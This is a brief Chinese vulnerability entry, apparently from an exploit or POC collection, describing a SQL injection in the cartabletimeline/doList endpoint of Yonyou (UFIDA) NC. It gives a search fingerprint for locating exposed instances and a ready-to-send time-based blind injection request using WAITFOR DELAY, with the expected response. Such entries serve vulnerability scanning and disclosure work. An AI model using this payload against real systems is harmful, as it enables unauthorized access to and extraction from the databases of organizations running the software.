# 用友NC-cartabletimelinedoList存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:2%27--+ HTTP/1.1`
- **响应特征**：200